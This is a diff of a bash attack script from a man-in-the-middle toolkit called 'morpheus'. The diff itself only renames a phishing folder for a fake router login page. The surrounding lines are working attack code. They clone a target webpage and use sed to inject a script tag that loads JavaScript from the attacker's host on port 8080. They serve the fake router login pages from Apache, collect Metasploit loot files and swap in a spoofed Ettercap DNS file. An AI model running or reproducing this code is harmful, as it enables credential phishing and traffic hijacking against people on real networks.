@@ -1479,7 +1479,7 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
   # wget -qq -U Mozilla -m -nd -nv -Q 900000 -A.html,.jpg,.png,.ico,.php,.js $GaTe | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="Cloning webpage: $GaTe" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
   # inject the javascript <TAG> in cloned index.html using SED command
 
-  cd $IPATH/bin/phishing/ROUTERS_DEFAULT
+  cd $IPATH/bin/phishing/router-modem
   cp index.html index.rb > /dev/null 2>&1
   echo ${BlueF}[☠]${white} Inject javascript Into clone webpage${RedF}!${Reset};
   sed "s/<\/body>/<script type='text\/javascript' src='http:\/\/$IP:8080\/support\/test.js'><\/script><\/body>/g" index.html > copy.html
@@ -1491,7 +1491,7 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
   cp index.html $ApachE/index.html # NO dev/null to report file not existence
   cp login.html $ApachE/login.html > /dev/null 2>&1
   cd ..
-  cp -r $IPATH/bin/phishing/ROUTERS_DEFAULT $ApachE/ROUTERS_DEFAULT > /dev/null 2>&1
+  cp -r $IPATH/bin/phishing/router-modem $ApachE/router-modem > /dev/null 2>&1
   cd $IPATH
 
 
@@ -1537,11 +1537,11 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
   mv /root/.msf4/loot/*.txt $IPATH/logs > /dev/null 2>&1
   mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
-  mv $IPATH/bin/phishing/ROUTERS_DEFAULT/index.rb $IPATH/bin/phishing/ROUTERS_DEFAULT/index.html
+  mv $IPATH/bin/phishing/router-modem/index.rb $IPATH/bin/phishing/router-modem/index.html
   mv /tmp/etter.dns $Edns > /dev/null 2>&1
   rm $ApachE/index.html > /dev/null 2>&1
   rm $ApachE/login.html > /dev/null 2>&1
-  rm -r $ApachE/ROUTERS_DEFAULT > /dev/null 2>&1
+  rm -r $ApachE/router-modem > /dev/null 2>&1
   # rm -r $IPATH/output/clone > /dev/null 2>&1
   cd $IPATH
 
